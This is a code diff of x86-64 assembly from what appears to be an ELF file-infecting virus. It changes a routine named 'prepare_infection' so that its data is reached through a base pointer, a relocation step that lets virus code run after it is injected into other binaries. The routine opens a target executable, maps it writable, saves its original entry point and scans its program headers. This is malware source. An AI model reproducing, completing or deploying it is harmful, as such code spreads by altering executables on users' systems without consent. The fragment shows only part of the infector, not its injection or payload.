@@ -3,7 +3,9 @@ prepare_infection:
 	PUSH_ALL
 	; celui la ici
 	mov		rax, SYS_open
-	lea		rdi, [rel path]
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.path
+	;lea		rdi, [rel path]
 	mov		rsi, 2
 	xor		rdx, rdx
 	syscall
@@ -14,8 +16,9 @@ prepare_infection:
 	jle		.return
 	mov		r12, rax
 
-
-	lea		rdi, [rel stack]
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.stack
+	;lea		rdi, [rel stack]
 	mov		rcx, 144
 	xor		rax, rax
 	rep		stosb
@@ -25,22 +28,25 @@ prepare_infection:
 	mov     rax, SYS_fstat
 
 
-
-	lea     rsi, [stack]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.stack
+	;lea     rsi, [stack]
 	syscall
 	cmp     rax, 0
 	jl     .close_file_nomap
 
 	; save file size
-	mov     rax, [stack + 48]
-	mov     [rel file_size], rax
+	mov     rax, [rsi + 48]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.file_size
+	mov     [rsi], rax
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
-	mov		rax, [rel file_size]
+	mov		rax, [rsi]
 
 	mov     rax, SYS_mmap
 	xor     rdi, rdi
-	mov     rsi, [rel file_size]
+	mov     rsi, [rsi]
 	mov     rdx, PROT_READ | PROT_WRITE
 	mov     r10, MAP_SHARED
 	mov     r8, r12
@@ -78,7 +84,9 @@ prepare_infection:
 	.continue_infection:
 
 	mov		rax, [r14 + 0x18] ; e_entry
-	mov		[old_entry], rax
+	mov		rcx, [rbp + 16]
+	add		rcx, mydata.old_entry
+	mov		[rcx], rax
 
 	movzx	rcx, word [r14 + 0x38] ; e_phnum
 	movzx	rdi, word [r14 + 0x36] ; e_phentisize
@@ -98,14 +106,18 @@ prepare_infection:
 	.close_file:
 		mov		rax, SYS_munmap
 		mov		rdi, r14
-		mov		rsi, [rel file_size]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.file_size
+		mov		rsi, [rsi]
 		syscall
 	.close_file_nomap:
 		mov		rax, SYS_close
 		mov		rdi, r12
 		syscall
 	.return:
-		lea		rsi, [rel path]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.path
+		;lea		rsi, [rel path]
 		call	sub_val
 		POP_ALL
 		ret
